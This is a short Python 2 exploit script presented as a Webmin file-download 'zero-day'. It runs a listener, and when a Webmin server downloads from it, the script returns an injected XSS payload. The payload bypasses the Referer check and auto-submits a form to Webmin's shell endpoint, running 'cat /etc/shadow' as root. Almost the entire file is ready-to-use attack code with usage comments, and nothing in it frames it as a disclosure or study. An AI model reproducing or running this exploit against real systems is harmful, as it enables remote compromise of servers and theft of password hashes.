import socket

#===================================================
#Run this script and listen for file download from webmin
#Enter payload to execute RCE
#wait for webmin to connect and download file
#Vulnerability is in Menu/Others/File Manager
#issue is webmin echoes back status of the download
#by injecting XSS we bypass the Referer: check by assign
#domain to victims own IP, then execute our RCE
#-----------------------------------------------------------
#e.g.
#Download from remote URL
#http://x.x.x.x:10000/shell/index.cgi
#> whoami
#root

PORT=int(raw_input("[PORT]> ")) #port we listen on for file download requests
WEBMIN_IP=raw_input("[Webmin IP]> ") #victim

#Read /etc/shadow file
CMD=("/><script>document.domain='http://"+WEBMIN_IP+":10000/shell/index.cgi'</script>"+
"<form action='https://"+WEBMIN_IP+":10000/shell/index.cgi' method='POST' enctype='multipart/form-data'>"+
"<input type='hidden' name='cmd' value='cat /etc/shadow'><script>document.forms[0].submit()</script></form>")

s = socket.socket()
HOST = '' 
s.bind((HOST, PORT)) 
s.listen(5) 

print '\nwebmin file download 0day...'

while True:
 conn, addr = s.accept() 
 conn.send(CMD+'\r\n')
 print 'Connected!'
 print s.recv(1024)
 conn.close()
s.close()


